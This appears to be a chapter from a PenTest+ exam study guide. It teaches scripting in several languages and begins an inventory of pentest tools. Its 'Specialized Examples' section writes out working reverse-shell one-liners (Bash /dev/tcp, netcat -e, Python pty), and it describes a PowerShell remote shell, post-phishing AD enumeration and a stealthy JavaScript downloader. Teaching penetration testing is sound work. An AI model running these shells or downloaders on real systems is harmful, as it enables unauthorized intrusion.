Functions are used when you have a repetitive task that needs to take input to the task or provide usable output from the task. You might make a function to determine if a JSON string is valid by providing the JSON string as an argument. You process the validation. Then, the function returns true if the JSON string is valid or false if it is not. JavaScript would implement this similarly to the following:

Our isValidJSON function takes a string called "JSONstring." The try statement says "try to parse the JSON into variable a." If it works, then it will finish the statement and return true because it is valid. If the JSON parsing fails, the catch statement will catch the error and return false, letting us know that it was invalid. Let's try it out:

We can see that when we specify our JSON string, it successfully parses, so it works. Let's try one that doesn't.

We didn't see any errors, but we did see that it returned false. The try/catch statements handled the errors for us. If we had just tried to parse this directly, we would have gotten an error:

We may use this function regularly to test the validity of data before the program submits it. Making a function allows us to reuse that code instead of repeatedly rewriting it and the error handling.

Classes

Classes are a programming tool that is used to keep data, functions, and procedures related to that data together. By keeping these things together, we can keep all of the code relating to that type of object in one place. By keeping the related data together, you can make sure you are updating it only once. We don't have to write functions for dealing with the data multiple times when we reuse this data within an application. In addition, when the contents of the class change, it will be able to be changed everywhere in the application. This is also handy when you may want to add in more error handling, validation, or manipulations to a piece of data.

Maybe a person has a first name, a last name, and an address. This type of data will be used throughout an application. You might create a class, so that everything that deals with a person can reference the same data structure. Doing so would also keep together the code relating to that person. Then, when you need to get the first name, you can do it in a consistent way. Python would do this as follows:

We have created a Person class that has an init function that will be called when a new object is created. The options passed to this function are used to automatically set the variables for the object. Each of them has a "None" default value, so you can specify as many of these as you'd like when defining a Person. In addition, it is common for Classes to have get and set functions that will return the data for any of the items or set the values for those that are allowed to be set. In addition, some functions may have additional logic, such as the getName function, which combines the first and last name together to return a singular name. Let's look at this in action.

Here, we create a new person called John Doe. We can print out the first name, change the first name to Jane, and then print out the new value. Because all of this is part of a singular class, we can add validation to any of these functions that will follow our class wherever else it is used, making sure that it is consistent throughout the application.

Libraries

Sometimes we may need classes and functions outside of the piece of code we're working in. By using libraries, the code can be used across multiple files or projects the same way. Many libraries are built into languages because they are things that everybody will need. Others need to be included. Sites like pypi.org and RubyGems.org are indexes of packages that contain libraries that others can use in their applications. This makes it easy to update code across multiple projects when necessary.

Many people may need to communicate with a database server, so making a library that does all the hard work benefits everyone. This library will likely include multiple classes, functions, procedures, data elements, and other information. We don't have to deal with all of those directly, though. We don't need to know all the details of how it is communicating to a database server. We only want it to work when we call db.connect().

Most programming languages have the concept of libraries; however, some languages, like Bash for instance, don't really use them. Instead, you can specify files that can be included into another file. When you do this, they are not treated hierarchically like they would be in Python or Ruby. Regardless of what type of data structures you are dealing with, packaging them together into bundles makes sense because it increases consistency across programs and projects and allows you to easily reuse instead of rewriting code. Understanding libraries is critical for larger projects and projects you intend to share with others to use in their projects.

Practical Examples

The PenTest+ exam objectives require you to know how to analyze a basic script in Bash, Python, Perl, Ruby, JavaScript, and PowerShell. In an effort to prepare you for that, we have included a basic scripting example in each language that you can use to compare them and see some of the previous structures in action. In the following section, we will address specialized examples in each language.

Before we get into the examples, we need to introduce the shebang. We know what language a script is written in based on the file extension, right? If it's .py, it's Python. If it's .sh, it's Bash. If it's .rb, it's Ruby, right? Not so fast. That's how Windows does it, but that convention didn't start in \*nix. Not only are hackers lazy and don't always put file extensions on their scripts, but systems can have multiple versions of a language installed. How do you know when to use Python2 vs. Python3? In \*nix-land, the first line of a script will typically include what is colloquially referred to as a hash bang or a shebang: #! This first line will define the absolute path to the scripting interpreter:

#!/usr/bin/bash

Since the file extension and the shebang give away the language, you probably won't get these clues during the exam. Instead, you'll need to understand enough about what is going on in the given code example to choose what code is missing based on the syntax. To prepare you for this, we won't include the shebang or file extension in our examples either. But if you look online for other examples, you might see it, and we figured we'd explain why we didn't include it. Without further ado, here is a basic script in each language that does the following:

1. Retrieve a JSON file "users/list" from a web location. This is what our file looks like:

2. Parse the contents of the JSON file by:

a. Checking the value of "success" and only proceeding if the value is true.

b. Checking the value of "count" in the JSON file (this should correspond to the number of records to be parsed) and only proceeding if the value is more than 0.

c. Then for each entry in the JSON file, it creates an entry in a comma-separated array.

3. The script will then print the count value and, using a loop, it prints each value from the array (each record in the JSON file) as a comma-separated table record with the table header "First,Last,Address,City." The output of our scripts will look like this:

Why Do We Call ! a Bang?

The short answer is: it goes back to typesetting. During modern times, this terminology has been adopted by \*nix folks. Just for fun, you can read more symbol names that have been used by technologists in a little piece of Internet history also known as the "Waka Waka Bang Splat poem": https://calvin.edu/news/archive/waka-waka-bang-splat-

Bash

Bash is used as the shell in a lot of Linux and UNIX-based environments. However, it's only one type of command shell. During a pentest, your target may not use Bash natively. Kali Linux, for instance, uses zsh by default. These other shells require different script syntax. If you encounter a system not using Bash during one of your pentests, you will either need to change your shell in order to use these examples or Bash scripting will only serve as a model for your efforts. Since the CompTIA PenTest+ exam will include Bash examples, we will focus only on this shell. We have provided some further reading about other shells that you may find informational during a pentest.

We are using the variable "r" to store the response from our web request, which we make with curl. In Bash, you can assign the output of commands to a variable by using $(command). Then our script uses echo to pipe the response through the jq command, which parses JSON. We are telling jq to pull the value for "success" and store it in the "suc" variable and the value for "count" and store it in the "count" variable. Our script then checks to make sure the value of success is "true" before proceeding and checks the value of "count" and prints "No results returned" if the value is not greater than 0.

EXAM TIP To identify Bash, take note of the double equals for string comparison, the use of -gt for comparison of a number, and the if statement syntax, which begins with the keyword "if" and ends with the keyword "fi." Also note that there is no special string concatenation operator. Our echo command to print the count simply supplies a space between the printed string and the variable, which is referenced as "$count." Lastly, did you see that we don't use a $ to assign a variable (e.g., "data=(value)"), but we do use a $ to reference a variable (e.g., "echo $line")?

The script stores the user values from the JSON into an array called "data." As before, we grab the "users" values from the JSON with jq and use join() to make the record into a comma-separated list of fields for each person. It uses a newline as a separator for each record in the array. The "data" array looks something like this once this part is done:

In Bash, the special shell variable "IFS" determines how Bash understands word boundaries. By default, any space, tab, or newline that Bash encounters is treated like a new record. By setting this only to a newline (\n), the script recognizes the newline as a record separator in our array, and it will print our comma-separated fields one line at a time.

NOTE RedHat's blog post "What's Your Favorite Shell for Sysadmin Work?" talks about several shells that are available for Linux, along with some of the differences in scripting syntax between them: https://www.redhat.com/sysadmin/favorite-shell

Python

Python is a very popular scripting language because of its perceived ease of use and its great tutorial documentation, which makes it very friendly for beginners. It resembles a lot of programming languages, making it a good jumping-off point for people who want to pursue other languages after learning Python, and it makes an easy transition for those who are already familiar with other languages.

With Python, we see our first use of a library, in this case, "requests." In Bash, we were able to use jq to parse our JSON, and we used curl to retrieve the file. But in Python, we have to use the get module from the "requests" library to retrieve the file and store the response in our "r" variable. Then we can use the json library to parse the "r" variable into a data structure we call "data."

EXAM TIP Python uses the term "import" for libraries, and does not end an if statement with a specific term. Instead, it uses the syntax: if (comparison) : with a semi-colon. Concatenation is done with a +, and we use print instead of echo. We also don't use $ to reference variables at all, and we use square brackets to reference the components of our data object.

Now we can evaluate each part of the JSON object by referencing the property names of the data structure "data." We check success, count, and concatenate the count value using a + operator; print our table header; and then loop through each entry in "users" to print our fields. Here, we're using string formatting operators to print each value as a string (%s) separated by a comma. Anything after the final % is the arguments we plan to print in that format. You may notice that Python has less punctuation than some of the other languages. This is because Python is space sensitive. The indentations and low punctuation may help you identify Python. But mixing tabs and spaces or using them inconsistently across edits will give you a bad day. Troubleshooting whitespace errors is a whole lot of not fun.

NOTE Python provides documentation of all of Python's capabilities in the form of a comprehensive tutorial of the language, which can be found here: https://docs.python.org/3/tutorial/index.html

Perl

Before Python, Perl was the predominant language for admins. It was used heavily in web development as well as scripting. In pentesting, Perl is powerful because it can be used at the command line with the -e option to complement the ability of Bash and other shells. Perl is well known for its powerful ability to manipulate text through Perl Compatible Regular Expressions (PCRE). Like Python, Perl also uses modules and libraries. In our Perl script, we're using libraries that help us use externally implemented functions to make web requests (LWP::Simple) and parse JSON.

We use the get function to retrieve the URL and store it in our "$r" variable. Then we use the JSON::decode\_json method to turn the JSON response into a data object. Now we do something weird. We reference the components of the data object (like success and count) with the -\>{value} syntax. We use this in our if statement to test for success and to check the value of count from our JSON. Then we print our table header and loop through all of the data values with a foreach loop.

EXAM TIP Recognize Perl by the use of the term "use" for libraries. Also, see that we are using $ to assign and reference variables. We still use == to compare strings, but we are now using \> to compare numbers. Concatenation is done with a . between values to be concatenated. You also see that we have a semicolon at the end of nearly every line and that our if and foreach loops follow the syntax if(condition){ action }, where curly braces designate the end of each block.

Ruby

Ruby is another popular scripting language. It was probably the most popular within the pentesting community because many Metasploit modules are written in the language. Ruby calls its libraries "gems" and uses require to take advantage of their code. In our example, we're getting help with making web requests, handling web responses, and parsing JSON from externally created functions within these gems.

Ruby uses the Net::HTTP.get\_response gem to capture the response of the web request and store it in our "r" variable. It then uses JSON.parse to turn the response body into a data object called "data." Once more, we reference the values using square brackets (like Python), but this time, we change the value of "count" into a string using the .to\_s method so that we can concatenate it to a string. Ruby can't mix numbers and strings during concatenation. Note, however, we do not need to use a special concatenation character inside our loop when we print the record because of how we are referencing the value inside the print statement (delimited by double quotes) as #{record["field"]}—we can simply print the variables and the commas together.

EXAM TIP Ruby uses the term "require" for libraries, == for string comparison, \> for number comparison, and + for concatenation. The if statement syntax starts with "if" and ends with "end." Loop syntax is (source data).each do |value|, where "value" is the reference inside the loop. Ruby may use print or puts to print strings.

JavaScript

JavaScript is a web-based scripting language best known for executing on the client side to make web pages more interactive. It is common in web drive-by attacks, downloaders, and browser hooks. JavaScript uses semicolons at the end of each statement (or instruction). You'll notice that our semicolons aren't consistent. That's because JavaScript will perform Automatic Semicolon Insertion (ASI) in the background, making semicolons somewhat optional. You can read more about the conditions under which this occurs here: https://dev.to/adriennemiller/semicolons-in-javascript-to-use-or-not-to-use-2nli

Runtimes execute your scripts and determine what global objects are accessible. There are several JavaScript runtimes. Each browser has a runtime environment that runs front-end applications, for example. This includes the engine that executes the script and the web APIs that determine how the browser fetches and interacts with data. There are also server-side runtimes for full-stack development using JavaScript. Our example uses Node.js (https://nodejs.org/en/), a server-side JavaScript runtime. Since this is a server-side runtime, we aren't writing to windows or alerts, but to the console. You may see other script snippets in other runtimes, so don't get too dependent on using the function and API names as a key to identify JavaScript based on this example. Keep in mind that our implementation is for illustrative purposes. It's not the only, or even best, way to implement this, but it should give you enough context to get you started with recognizing JavaScript.

Our script uses require to read JavaScript from an http module that gives us the ability to make web requests and manipulate them. We are using const to define a reference for this data as a variable that won't be changed by the rest of the script. Otherwise, JavaScript uses "let" to assign variables. This lets us do http.get to use the get function we read in from the http module to make web requests and store the response. Node uses .on to register an event handler to parse the JSON when the response comes back and assign the parsed result as "data." The try/catch syntax gives us some basic error handling. We test the success and count values, then iterate the values inside "data" with a for loop, writing the results to the console.

EXAM TIP JavaScript uses == for string comparison, \> for number comparison, and + for concatenation. Our if statement syntax starts with "if," and the content is denoted with curly braces. Loop syntax is for(comparison){. Instead of printing, echoing, or using puts, JavaScript writes to the console with console.log or with a test writing to a document with document.write.

PowerShell

PowerShell is to Windows what Bash is to UNIX and Linux. PowerShell is a Microsoft scripting language that is useful for performing administrative tasks when you have access to a Windows system. It can make interacting with Active Directory and the automation of tasks easier as well. In our later examples, we'll show how this plays into attacks during a pentest. As most of the content is similar to syntax we've already covered in other languages, we won't explain this one in depth. But we do need to make two notes to help you understand something a little weird here.

We are using the Invoke-RestMethod (irm) cmdlet to make our request, which will store the result as a data structure called "data." PowerShell does have for each loops, and they look similar to the syntax from other languages: for each ($variable in array){ do stuff }. However, in our example, we are using the $object.value | ForEach-Object{ do stuff } syntax. This is PowerShell pipelining. It is passing the object to the loop for processing.

EXAM TIP PowerShell uses -eq and -gt for string comparison and for number comparison and + for concatenation. PowerShell also uses Write-Host to do our printing to the screen. Our if statement syntax starts with "if," and the content is denoted with curly braces. The for each loop uses the $data.users | %{ commands } format.

Specialized Examples

Now that you've seen the same thing implemented in the various scripting languages, let's dig into some specialized examples that you might use during a pentest. Each of these examples covers a specific use case or scenario that is pertinent to real-life penetration testing.

Bash Shells

There are many ways to set up a command and control shell in Bash. We can't cover every possible permutation here, but we would be remiss not to include several examples using Netcat and other common \*nix commands with Bash.

Bash Reverse Shell

The following script requires privileged access, as you are attempting to use the TCP device directly. The -i flag makes the shell interactive. &\> redirects the standard output and standard error from the shell to the TCP connection. The 0\>&1 part reads standard input from the TCP connection.

bash -i &\> /dev/tcp/10.0.123.1/8675 0\<&1

NOTE /dev/tcp does not exist on all \*nix distributions. This may or may not work depending on your target.

Using Netcat

The following line uses Netcat to serve over the IP and port supplied:

nc -e /bin/bash 10.0.123.1 8675

Or you could set up a Netcat listener:

nc -u -lvp 4242

NOTE Netcat does not exist on all \*nix distributions, and when it does, different versions may implement different flag options. Keep this in mind, as this may or may not work depending on your target.

NOTE To learn more about Netcat (nc) and its various flags and uses, check out the man page at https://man7.org/linux/man-pages/man1/ncat.1.html.

More Bash Shells

In this example, 867 is a randomly chosen number. We're opening this randomly numbered file descriptor and reading and writing to it using exec, redirecting input and output to and from the TCP socket we create by accessing /dev/tcp directly.

0\<&867;exec 867\<\>/dev/tcp/10.0.0.1/4242; sh \<&867 \>&867 2\>&867

The -l flag tells Bash to act like it had been invoked as a login shell. In contrast, the -i flag sets up Bash to be interactive.

/bin/bash -l \> /dev/tcp/10.0.0.1/4242 0\<&1 2\>&1

You can even set this up with a loop. As before, 7 is an arbitrary number we use for a file descriptor.

NOTE There are numerous examples of shells using various techniques in Swissky's GitHub repo "PayloadsAllTheThings": https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

Bash Automation

We talked about Nmap output file formats in Chapter 2. One of those was the greppable file format. Let's take a look at how we can use Bash to turn greppable Nmap results into something we can use for the next phase of our pentest, starting with a basic ping scan to see what's up on the network:

$ nmap -sn 10.10.0.0/24 -oG ping-scan

This creates a greppable file:

Now we can make a target file with all of the responding hosts by using awk to print the second entry delimited by tabs or spaces and redirect it to a file called "targets.txt":

$ cat ping-scan.gnmap | grep "Status: Up" | awk '{print $2}' \> targets.txt

That leaves us with a file with only the IPs, one per line. Now let's feed that into Nmap to do a basic port scan. We'll use -iL to use our targets.txt file for the Nmap targets. Then we'll do a fast TCP scan (SYN only) with -sS for common ports using -p such as SSH, HTTP/S, SMB, and RDP. We only care about the open ports for this.

Here are our results:

We have two entries for each host, one with the overall status (Up) and one with the Ports defined by number/status/protocol//service/// in a comma-delimited format. We want to do some more investigation of our web servers. We can use Bash to create a script to test our web hosts with Nikto and use Nmap to enumerate ciphers.

Nikto's syntax is perl nikto.pl -h \<ip address\> -p \<port\>, and Nmap's syntax will be nmap -sV –script ssl-enum-ciphers -p \<port\> \<host\>. We want to create two scripts: one that will automatically run Nikto and one that will process our Nmap scans. To do this, we need to extract the IP address and the port for all the hosts that have a web server. Figure 11-2 shows how we can do this in Bash.

Figure 11-2 Bash Nmap parser

We use the special IFS variable to make sure Bash doesn't split our lines outside of a newline character. Then we pull our IP (the second item on the line) into a variable using awk. We dump the rest of the line into the "ports" variable by using awk with the tab separator to isolate the second part of the string. Then we split the string with cut by defining a colon delimiter and taking everything from the second position to the end of the line. Finally, we replace every instance of "/ " with a ^ so that we have a definitive array separator. When we set IFS to use the karat, we can turn the "ports" variable into an array called "parray" using read. Now, we can loop through our array values. If our value contains the string "http," we want to print the IP and the port to our Nikto file. If the value contains "https," we also want to send it to our Nmap file. First, we have to strip some extra characters off of our port entry because we only want the number. Now we have files we can execute. All we need to do is chmod +x the resulting .sh files to automatically attack our web servers with Nikto and Nmap.

CAUTION If you run too many simultaneous Nikto attacks, you're going to have a bad day. In a real-world scenario, you'd probably want to split this file into small chunks to run it.

PowerShell Shells

Bash isn't the only shell we can use to establish a remote shell. Figure 11-3 shows an example of one way to do this in PowerShell. Remember, there are many ways to implement these types of scripts. Consider this as an example, and use it to understand the language syntax.

Figure 11-3 PowerShell reverse shell

First, we define an IP address and port combination to listen on. Then we set up a listener that will accept connections and start listening. The $listener. AcceptTcpClient() waits until someone connects and then assigns the connection to the variable "c." GetStream() then gets the information from that client connection. Because the network communicates in bytes, we need to allocate space for our communications buffer, which we assign as variable "b." Now we use a while loop to take action as long as data comes in. We set up an ASCII encoder to turn the incoming data into a string. If the data begins with "exit," it will drop out of our loop and end the connection. Otherwise, it executes PowerShell using the iex cmdlet, which is short for "Invoke-Expression." This executes the string as PowerShell and returns the value. By passing it to the out-string, we convert it to a user-readable string. It sends that string to the client. If, for some reason, an error occurred, PowerShell would send a message to the client stating that the data was invalid. Our loop will stop if something happens to the connection. So, we have to clean it up and stop the listener so that the IP address and port combination isn't already in use if something fails and we have to reconnect.

CAUTION Invoke-Expression is dangerous because you don't necessarily know what someone else has put in the string for PowerShell to execute. In this example, it's fairly safe because it's our shell. But you should never use this in a place where you might have reason to distrust user input.

PowerShell: Enumerating AD Users and Computers

Assume you have successfully phished into an environment. You have a callback from a Windows system in a domain. You want to enumerate users and other computers from Active Directory in order to identify targets and perform environmental recon. Let's look at how we could do this in PowerShell.

First, we'll query the current AD domain that we're in. Then, we'll set up an LDAP connection using ADSI to our domain controller. The format is LDAP:// followed by the domain name. Next, we want to create a DirectorySearcher object that will let us search LDAP. We create an LDAP filter to search for users and set the search root for the top of the domain, which is the distinguished name of the domain. It uses the FindAll command to return all of the results and store it in an object called Results. We create an empty array called users to store our user data, then parse through Results to populate it. The PSCustomObject lets us set the name:value pairs that we want to appear in our CSV output file. For the MemberOf value, we don't want to risk messing up a CSV file with lots of commas, so we swap the delimiter with a |. This lets us still easily see the different groups. Now we export the users object to a CSV file. The -NoTypeInformation option means that we don't put the object type in the first line of the file, since we only care about the data. It still automatically provides a header with our field names.

NOTE Microsoft has an article that explains LDAP search syntax: https://docs.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax

We can do the same thing for enumerating other assets—in this case, groups. We changed the LDAP filter and the PSCustomObject properties to reflect the fact we are now searching for groups.

Python Port Scanner

Figure 11-4 is an illustration of a basic port scanner written in Python that implements flow control, looping using a for statement, error handling using try and except, and an array, which is defined as the range of ports to scan.

Figure 11-4 Python port scanner

Executing the port scan evaluates the state of each port defined in the "range" of ports. Threading is used to execute multiple tasks in parallel in order to optimize the speed and efficiency of program execution. The two import statements at the beginning of the script import program dependencies in order to successfully execute the script. The "sock" Python module is used for communicating over the network using the socket interface.

CAUTION The Python port scanner shown in Figure 11-4 is just an example of using threads and doesn't compare to the error correction and operational functionality of commercial or open-source port scanners. Depending on what you are doing, launching 9,000 threads may take down some hosts, especially if the target is dropping packets. Proceed with caution.

Input and output (I/O) functions are necessary to communicate what the program is doing and what the program needs in order to successfully execute. The simplest form of producing output is to print it to the screen, or terminal window if you are working from the command line. In Figure 11-3, line 15 uses a print statement to display the open port numbers to the terminal window. If we wanted to print the output to a file, we could comment out line 15 and add the following to print to a file called results.txt, as shown in Figure 11-5:

Figure 11-5 Python write-to-file example

To dissect these new statements a little further, the "w" in line 5 declares the file mode to be writable. There are a number of modes for opening a file, including "r+" for reading and writing and "w+," which opens a file for reading and writing but overwrites the file if it exists. The open() function opens the file and creates a new file object to do something with it. This is required before you can read or write to the file. The write() method is a file object access method used to write to the file object—in this case, our file object is "results." The statement on line 16 will write the string 'Port: ' and 'is open' as well as the specific port +repr(port) found to be open from our socket connect on line 13. The \n is a newline identifier, so the output is written to multiple lines.

TIP Another way to read or write to a file from the command line in Linux is by using redirection operators. "\<" gives input to a command, the "\>" directs the output of a command to a new file, and "\>\>" appends the output of a command to a file.

Python Encoding

During a pentest, encoding can help transfer exploit payloads to vulnerable services and help provide obfuscation of a technique being exploited against a target. Here is a basic example of using base64 encoding and decoding to transform the string value "Enc0deS3cr3t":

Using Python to Upgrade to a Fully Interactive Shell

When you get a shell on a host, it's not always fully interactive. Fully interactive shells have terminal control, so that you can use background processes, use editors, and the like. Some exploits will give you a simple shell, and you will need to upgrade to a fully interactive shell to accomplish more advanced tasks. Here is a simple one-liner that will allow you to upgrade to an interactive shell on the victim host:

python -c 'import pty;pty.spawn("/bin/bash")' &

Note your $TERM, rows, and columns on your attack host. In our example, we are assuming linux for the TERM value and 35 rows and 70 columns. Then supply them to the victim host:

Using Perl to Modify IP Addresses in a File

For a network pentest, being able to manipulate IP addresses, ranges, and CIDR lists is a daily part of life. Let's take a look at how we can use Perl to make our lives easier when this happens. For a network pentest, we have been given this targets file:

We're going to use this for web scanning, Nmap, and a host of other tools. However, upon further review, our contact has told us that someone made a typo when establishing the original scope. All of the IP addresses starting with 10.186.250 need to be removed and changed to 10.186.243. Oh, and one more thing. We need to make sure you absolutely do not touch 10.186.157.23. We can still observe this file format and use IP ranges, CIDR notation, and single IPs, but we need to make these changes and remove any duplicates. Figure 11-6 shows a Perl script that will accomplish our goals.

Figure 11-6 Perl script to fix IP addresses

Perl has some modules that already deal with CIDR notation, and we want to make our output look pretty, so we use Data::Dumper and Net::CIDR to help us. We read in our targets file (iplist.txt), remove any trailing whitespace, and store the content in an array called "lines." Then we rewrite our 250s as 243s using a substitution regex, which looks for lines beginning with 10.186.250 and replaces that part of the string with 10.186.243. Then we have to parse our CIDR range to remove our exempted IPs and reprint the result as a range of IP addresses using our handy CIDR module to create a comma-separated string. Then we reassemble our results, replacing the commas with newlines to generate our new targets list.

Here's the output of our script:

Perl Reverse Shell

You may encounter one-liners on the exam. These may have parts of the command blanked, and you may need to provide or choose the missing pieces that would make the command work. Perl is often used as a command-line one-liner. Here's an example of a reverse shell implemented as a one-liner in Perl:

NOTE This requires the Perl module IO::Socket to be installed.

Let's take a closer look at the socket command. This defines the type of socket that will be opened. We've included a reference, described next, where you can read more about the specific options used. In this case, we're creating a TCP socket to stream data, and we're calling our socket "S." The connect statement attempts to create a connection to a remote host. It uses the inet\_aton to turn an IPv4 address into byte format that can be passed to the socket for use in the network connection. Then it redirects all of the standard error, input, and output to the socket, so that when you execute Bash, it will get its input from the socket and send all of its output to the socket.

NOTE To read more about Perl's implementation of sockets, the Perl documentation goes into deeper detail about the special constants (such as PF\_INET and SOC\_STREAM), as well as details about how Perl can negotiate socket connections.

JavaScript Downloader

JavaScript is a common way to implement a file downloader, since web access is typically not blocked from within an organization. Let's take a look at an example of a downloader implemented in JavaScript. As a client-side JavaScript, this would be embedded in a normal HTML document with \<html\> and tags, served as a web page, and likely accessed by a browser. To include jquery, we read it in with a \<script\> tag.

We want to be able to use the script to download our content from the same place where our web page is hosted. This helps us avoid suspicion. To do that, we grab the URL where this web page is hosted and strip the URI path. The downlad() function is called whenever someone submits the form. It takes the base URL, the value input into the form, and it combines it into a single URI. It uses the jquery get method to request that URI and puts the response in a new element. The element includes the data object that we just downloaded. It then appends the link we just created into the page and programmatically clicks the link to initiate download of the file. The file will have the same name as what we entered into the form.

Chapter Review

Scripting is an essential skill for pentesters, and there is a whole subobjective called out in the CompTIA PenTest+ exam objectives, which means you may come across examples or references to scripts written in Bash, Python, Ruby, Perl, JavaScript, or PowerShell. Pentesters don't have to be programmers, but they should have some understanding of the language syntax in order to understand what scripts are doing, to modify them, and perhaps to write them well enough to help with some pentest automation. In this chapter, we looked at how the various scripting languages use logic constructs, data structures, and implement other programming concepts using practical examples.

Tools Inventory

In this chapter, you will learn about

• Identifying use cases for various pentest tools that may be found on the CompTIA PenTest+ exam

Since the scope of the exam is so broad, it would be impossible to cover every tool and technique in the detail it truly deserves within the scope of this book. We know you will need to undertake independent research to supplement the knowledge this book provides in preparation for the exam and your career as a pentester. In this journey there are so many tools to keep track of that we wanted to use some space to provide you with a reference list of tools that have been mentioned throughout the book to help you study for the exam. Many tools fall into multiple categories of use, so we will simply cover each tool alphabetically rather than attempting to group these tools into categories.

Aircrack-ng Suite

Aircrack-ng (https://www.aircrack-ng.org/) is a wireless testing suite comprising various command-line tools. It is discussed more broadly in Chapter 4. It can help capture wireless traffic; replay traffic; crack WPA, WPA2 PSK, and WEP; and perform attacks such as deauthentication attacks, creating fake access points, and injecting packets. Some of the tools it includes are the following:

• airbase-ng can act as an ad hoc AP, capture, and filter packets.

• aircrack-ng is a WEP and WPA key cracking program that runs against capture files.

• airdrop-ng is a program for targeted deauthentication attacks.

• aireplay-ng can replay or inject frames. It is primarily used to generate traffic for cracking with aircrack-ng, but can also perform chopchop, deauthentication, and fragmentation attacks.

• airgraph-ng processes .csv files from airodump-ng into graphical visualizations of wireless networks.

• airmon-ng puts a wireless card in monitoring mode, which allows the device to capture wireless traffic without first connecting to a wireless network. This is often used for wireless reconnaissance and as a prerequisite step for other aircrack-ng suite tools that capture traffic.

• airodump-ng is used for capturing wireless traffic, and is very useful when collecting WEP initialization vector (IV) data for aircrack-ng. This can be combined with a GPS to map wireless signals geographically.

• besside-ng can be used to automatically crack WEP keys and log WPA handshakes for cracking.

• Dcrack enables distributed cracking for WPA/2 PSK across multiple servers.

• Mdk4 (see mdk4 entry).

• packetforge-ng can create encrypted packets for injection and replay on wireless networks if you have a pseudo-random generation algorithm (PRGA) file obtained from fragmentation attacks or a chopchop attack, for example.

Android SDK Tools

Android SDK (https://developer.android.com/studio/intro) tools are the official Android API tools, including an integrated development environment (IDE) for developing Android applications. They are useful for mobile application and device testing, including source code analysis.

APK Studio

APK Studio (https://github.com/vaibhavpandeyvpz/apkstudio) is an IDE designed with reverse engineering Android applications in mind. It allows you to decompile, recompile, sign, and install APKs for Android devices; edit and view code; and includes a hex editor for binary files. This is useful if you have a compiled Android application you need to reverse or need to bypass certificate pinning in order to intercept traffic between the application and a remote service. Additional functionality is explored in Chapter 7.

ApkX

ApkX (https://github.com/b-mueller/apkx) is a Python wrapper for multiple tools that extracts Java source code from APK files. This automates the process of extraction, decompilation, and conversion. Here is an example of usage:

This tool is useful when you need to examine the actual Java code within an APK for code tampering and reverse engineering. Refer to the OWASP Mobile Testing Guide section "Decompiling Java Code" for more information about usage: https://github.com/OWASP/owasp-mstg/blob/e6e3f113c44e76fc1481fff063fe44800d5bfcd5/Document/0x05c-Reverse-Engineering-and-Tampering.md#decompiling-java-code

Bash

Bash (https://www.gnu.org/software/bash/manual/bash.html) is a \*NIX operating system shell: the command-line interface and command language interpreter for many \*NIX systems. Scripts written in Bash can be used for pentest and system administration automation, including reverse and bind shells, shell escapes, and privilege escalation, among others. Bash is covered in more detail in Chapter 11.

BeEF (Browser Exploitation Framework)

BeEF (https://beefproject.com/) is an exploitation tool that focuses on client-side attacks (like XSS and session hijacking) against web browsers. You can use BeEF in web-based social engineering attacks by generating and injecting JavaScript hooks into web content that allow you to interact with the target browser via a console provided by the BeEF tool. This can be used to gain footholds on a hooked target, steal credentials or authentication materials, and execute other attacks within the context of the browser.

BloodHound

BloodHound (https://bloodhound.readthedocs.io/en/latest/) explores relationships between objects in Active Directory or Azure and displays them graphically. This is potentially useful for identifying privilege escalation opportunities along an attack path, but running the tool against an environment is typically very noisy and potentially disruptive. It should be scoped carefully during any assessment and used thoughtfully, or potentially avoided when stealth is a primary operational concern. Examples of BloodHound use are shown in Chapter 9.

Brakeman

If you need to perform static application security testing (SAST) against a Ruby on Rails application, Brakeman (https://brakemanscanner.org/) will take Rails source code, scan it, and produce a report of potential security issues. As with all automated code analysis tools, it may generate false positives, so its results should be manually reviewed. It will also miss issues that are introduced during runtime by interaction with other components, so it should be used with other tools and DAST methodologies to fully evaluate an application for pentesting. It is run from the command line using dashed options (-A, -n, etc.) to define its behavior and can either target a specific application and path or run against the application in the current directory.

Burp Suite

Burp Suite (https://portswigger.net/burp) is a web security testing toolkit offered as a graphical application. It has both a Professional and a free Community edition. Burp Suite allows you to proxy and intercept, tamper with, replay, and inject web traffic. It offers various plugins (like DirBuster) via a community store that automate attacks such as brute force, SQL injection, and attacks against session management. It even contains a decoder to make it easier to transform and analyze web data. Burp Suite will show the request and the response for various web traffic and has an embedded browser for testing. It can passively or actively crawl sites and highlight potential security issues as it goes using a built-in vulnerability scanner. Examples of Burp Suite usage can be found in Chapter 5, and additional use cases are discussed in detail at the portswigger website: https://portswigger.net/burp/documentation/desktop/penetration-testing

Cain

Cain (https://web.archive.org/web/20190603235413/http://www.oxid.it/cain.html) is the cracking component of the Cain & Abel tool. Cain was originally created as a GUI application for older versions of Windows (Windows 2000 and earlier). It can crack passwords using brute force and dictionary attacks, and it supports rainbow tables. Password targets include WEP, NTLM and LM hashes, NTLMv2 hashes, MD5 hashes, SHA-1 and SHA-2 hashes, Cisco IOS and PIX hashes, and RADIUS and IKE PSK hashes. The tool is older and well-known, and therefore recognized as malware by most host security products. It's mainly useful when other crackers do not support the hash type or when rainbow tables would be faster than GPU-based attacks using dictionaries or rules-based brute force. Another tool that implements rainbow tables is RainbowCrack.

Call Spoofing Tools

Many tools aid in caller ID spoofing, and the Social-Engineer blog has a great list (https://www.social-engineer.org/framework/se-tools/phone/caller-id-spoofing/). Generally, the purpose is to hide the phone number you are calling from or make it appear as another number during phone-based social engineering attacks. Many business phones show the caller ID information, and it raises less suspicion if the source number appears familiar to the person answering the call. Local and regional laws may affect what is legally allowed when it pertains to caller ID spoofing, so be aware of these limitations as part of your scoping exercise.

Censys

Censys (https://censys.io/ and https://search.censys.io/) scans publicly exposed assets on the Internet and stores the details in a searchable database. The searchable database is useful for performing passive reconnaissance about a target using data gathered about ports and services listening on hosts and other data exposed in their certificates.

CeWL

The Custom Word List Generator (CeWL) (https://github.com/digininja/CeWL) will crawl target websites and assemble a wordlist using interesting terms identified during the crawl, including e-mail addresses. These wordlists can then be used for further targeting, brute-forcing possible URLs, hostnames, or even as password cracking dictionaries. CeWL is written in Ruby and is designed to be run from the command line using flags (e.g., -w0) to govern its behavior. Options include controlling the depth of the crawl, output file, user agent to send, length of words that it collects, and whether or not to include e-mail addresses.

Cloud Custodian

